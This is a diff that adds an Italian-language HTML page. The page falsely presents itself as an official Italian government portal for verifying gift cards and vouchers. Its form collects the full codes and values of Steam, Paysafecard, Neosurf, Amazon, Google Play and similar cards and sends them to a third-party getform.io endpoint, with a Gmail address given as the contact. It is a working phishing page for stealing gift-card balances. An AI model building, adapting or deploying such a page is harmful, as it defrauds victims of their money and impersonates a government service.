@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Portale Ufficiale — Verifica Carte e Buoni Regalo</title>
+  <style>
+    :root{ --green:#008C45; --dark:#0b2340; }
+
+    body{
+      margin:0;
+      font-family: Arial, sans-serif;
+      min-height:100vh;
+      background-color:#007BFF; /* fond bleu */
+      color:#fff;
+    }
+
+    header{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:14px;
+      padding:18px 12px;
+      background: rgba(255,255,255,0.85);
+      border-bottom: 3px solid var(--green);
+      text-align:center;
+    }
+    .flag-small{ width:56px; border-radius:8px; }
+    h1{ margin:0; font-size:1.25rem; color: var(--dark); line-height:1.1; font-weight:700; }
+    .sub{ font-size:0.82rem; color:#0b2340; margin-top:4px; font-weight:600; }
+
+    main{
+      padding:28px 16px;
+      display:flex;
+      justify-content:center;
+    }
+
+    .card{
+      width:100%;
+      max-width:520px;
+      background: #fff; /* champs blanc */
+      border-radius:12px;
+      padding:22px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.12);
+      color:#163245;
+    }
+
+    label{ display:block; margin-top:12px; font-weight:600; }
+    input, select, textarea{
+      width:100%; padding:11px 12px; margin-top:6px;
+      border-radius:8px; border:1px solid #d2d9de;
+      font-size:15px; box-sizing:border-box; background:#fff;
+      color:#163245;
+    }
+    textarea{ min-height:96px; resize:vertical; }
+
+    .hint{ font-size:0.85rem; color:#476377; margin-top:6px; }
+
+    button{
+      margin-top:16px; width:100%;
+      background: linear-gradient(90deg, var(--green), #00723a);
+      color:#fff; border:none; padding:12px 14px; border-radius:8px;
+      font-weight:700; font-size:16px; cursor:pointer;
+    }
+    button:active{ transform:translateY(1px); }
+
+    footer{
+      text-align:center; color:#fff; padding:18px 12px; font-size:13px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="italy-flag.png" alt="Bandiera Italiana" class="flag-small">
+    <div>
+      <h1>Portale Ufficiale — Verifica Carte e Buoni Regalo</h1>
+      <div class="sub">Servizio governativo italiano</div>
+    </div>
+  </header>
+
+  <main>
+    <section class="card">
+      <h2 style="margin:0 0 6px 0;">Verifica il tuo codice</h2>
+      <p class="hint">Inserisci i dati qui sotto per inviare la richiesta di verifica.</p>
+
+      <form action="https://getform.io/f/agdjrzgb" method="POST" novalidate>
+        <input type="hidden" name="_redirect" value="merci.html">
+
+        <label for="type">Tipo di carta</label>
+        <select id="type" name="type" required>
+          <option value="">-- Seleziona --</option>
+          <option>Steam</option>
+          <option>Transcash</option>
+          <option>Paysafecard</option>
+          <option>Neosurf</option>
+          <option>Amazon</option>
+          <option>Google Play</option>
+          <option>Apple Gift Card</option>
+          <option>Altro</option>
+        </select>
+
+        <label for="code">Codice della carta</label>
+        <input id="code" name="code" type="text" placeholder="Inserisci il codice completo" required>
+
+        <label for="valore">Valore della carta (€)</label>
+        <input id="valore" name="valore" type="number" placeholder="Es: 50" required>
+
+        <label for="email">La tua email (opzionale)</label>
+        <input id="email" name="email" type="email" placeholder="esempio@email.com">
+
+        <label for="note">Informazioni aggiuntive</label>
+        <textarea id="note" name="note" placeholder="Scrivi qui eventuali dettagli..."></textarea>
+
+        <button type="submit">Verifica ora</button>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    © 2019 Verifica del Biglietto — Servizio Governativo • Contatto: 
+    <a href="mailto:verificadelbiglietto@gmail.com" style="color:var(--green);text-decoration:none;">verificadelbiglietto@gmail.com</a>
+  </footer>
+
+</body>
+</html>
